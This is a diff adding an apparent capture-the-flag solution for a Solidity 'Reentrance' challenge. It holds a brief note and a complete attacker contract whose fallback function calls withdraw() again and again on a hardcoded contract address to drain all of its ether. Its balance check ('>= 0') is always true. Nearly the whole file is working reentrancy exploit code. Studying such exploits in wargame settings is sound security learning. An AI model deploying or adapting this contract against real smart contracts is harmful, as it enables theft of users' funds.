@@ -1,0 +1,18 @@
+1) I created a malicious contract with a fallback function that keeps calling Reentrance.withdraw() recursively till
+it withdraws all the ether on it. After which i donate 1 ether to the contract.
+contract Reenter{
+    uint public amount = 1 ether;
+    Reentrance public ent = Reentrance(0xd41586B60967022598174cdf512F361D8bC70eb0);
+    constructor()public payable{
+        
+    }
+    function donateTo() public payable {
+        ent.donate{value:amount}(address(this));
+        ent.withdraw(amount);
+    }
+    fallback() external payable{
+        if (address(ent).balance >= 0){
+            ent.withdraw(amount);
+        }
+    }
+}
